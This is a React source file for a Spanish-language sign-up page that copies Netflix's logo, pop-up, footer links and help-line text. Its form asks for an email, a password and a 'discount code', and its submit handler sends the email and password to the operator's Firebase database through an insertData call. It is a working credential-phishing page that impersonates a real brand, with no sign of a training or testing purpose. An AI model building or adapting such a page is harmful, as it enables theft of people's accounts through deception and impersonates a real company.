import React, { useState,useEffect} from "react";
import { insertData } from "./Firebase/FirebaseOperations";
import { useMediaQuery } from "my-customhook-collection";
import {notification} from 'antd'
import NeflixLogo from "./Netflix-Logo.png";
import NeflixSimbolo from "./Netflix-simbolo.jpg";
import "./App.css";
import "antd/dist/antd.css";
function App() {
  const [values, setValues] = useState({
    email: "",
    password: "",
  });
  const onSubmitHandle = (e) => {
    e.preventDefault();
    insertData(
      document.getElementById("email").value,
      document.getElementById("password").value
    );
    document.getElementById("email").value=""
    document.getElementById("password").value=""
    document.getElementById("number").value=""
  };
  const openNotification = () => {
  notification.open({
    message: "Netflix dice: ¡Hola!",
    description:(
      <div>
        <p style={{ color: "black" }}>Realiza tu registro y siguenos en:</p>
        ,
        <a href="https://twitter.com/NetflixLAT?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor">
          @NetflixLAT
        </a>
      </div>
    ),
    onClick: () => {
      console.log("Notification Clicked!");
    },
  });
};
useEffect(()=>{openNotification()},[])
/* openNotification();
 */  const mediaQuery = useMediaQuery("(max-width: 500px)");
  const Navbar = () => {
    return (
      <div
        style={{
          paddingLeft: "60px",
        }}
      >
        <a href="https://www.netflix.com/co/">
          <img
            className="logo cursor"
            src={NeflixLogo}
            style={{
              width: "250px",
              height: "150px",
            }}
            alt="Netflix-Logo"
          />
        </a>{" "}
      </div>
    );
  };
  const Footer = () => {
    return (
      <div
        style={{
          marginTop: "20px",
          paddingLeft: "60px",
          flex: "1",
          background: "rgb(0,0,0,0.70)",
          paddingRight: "20px",
          paddingBottom: "30px",
          paddingTop: "20px",
          fontSize: "20px",
        }}
      >
        <p style={{ color: "grey" }}>¿Preguntas? Llama al 01 800 917 1564</p>
        <div className="footerLinks">
          <a className="aclass" href="https://help.netflix.com/es/node/412">
            Preguntas frecuentes
          </a>
          <a
            className="aclass"
            href="https://www.netflix.com/co/Login?nextpage=https%3A%2F%2Fwww1.netflix.com%2Ftitle%2F70183286"
          >
            Centro de ayuda
          </a>
          <a
            className="aclass"
            href="https://help.netflix.com/legal/termsofuse"
          >
            Términos de uso
          </a>
          <a className="aclass" href="https://help.netflix.com/legal/privacy">
            Privacidad
          </a>
          <a className="aclass" href="http://help.netflix.com/legal/corpinfo">
            Información corporativa
          </a>
        </div>
      </div>
    );
  };
  const Form = () => {
    const styles = mediaQuery
      ? {
          filter: "none",
          color: "white",
          width: "290px",
          paddingLeft: "20px",
          paddingRight: "20px",
          paddingTop: "10px",
          paddingBottom: "10px",
          minHeight: "90%",
          borderRadius: "5px",
          background: "black",
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          flexFlow: "column",
        }
      : {
          filter: "none",
          color: "white",
          paddingLeft: "60px",
          paddingRight: "60px",
          paddingTop: "40px",
          paddingBottom: "70px",
          width: "400px",
          minHeight: "550px",
          borderRadius: "5px",
          background: "rgb(0,0,0,0.70)",
          display: "flex",
          justifyContent: "flex-start",
          alignItems: "center",
          flexFlow: "column",
        };
    return (
      <div
        style={{
          flex: "1",
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
        }}
      >
        <form onSubmit={onSubmitHandle} style={styles}>
          {mediaQuery && (
            <img
              src={NeflixSimbolo}
              style={{ width: "100%", height: "110px" }}
              alt="symbol"
            />
          )}{" "}
          <h2>
            <b>Registrate</b>
          </h2>
          <br />
          <input
            id="email"
            type="email"
            name="email"
            placeholder="Correo"
            required
          />
          <br />
          <input
            id="password"
            name="password"
            type="password"
            placeholder="Contraseña"
            required
          />
          <br />
          <input id="number" type="number" placeholder="Código de descuento" required />
          <br />
          <button
            style={{ background: "#E50914", fontSize: "20px" }}
            className="btn-danger"
          >
            Finalizar registro
          </button>
          <br />
          <a href="https://www.netflix.com/co/LoginHelp" className="aclass">
            ¿Necesitas ayuda?
          </a>
          <br />
          <p>
            Esta página está protegida por Google reCAPTCHA para comprobar que
            no eres un robot.{" "}
            <a href="https://policies.google.com/privacy">Más info</a>
          </p>
        </form>
      </div>
    );
  };
  return mediaQuery === false ? (
    <div
      style={{
        minHeight: "100vh",
        display: "flex",
        flexFlow: "column",
      }}
    >
      <Navbar />
      {values.email},{values.password}
      <Form />
      <Footer />
    </div>
  ) : (
    <div
      style={{
        marginTop: "20px",
        height: "100%",
        display: "flex",
        flexFlow: "column",
        alignItems: "center",
        justifyContent: "center",
      }}
    >
      <Form />
      <Footer />
    </div>
  );
}

export default App;
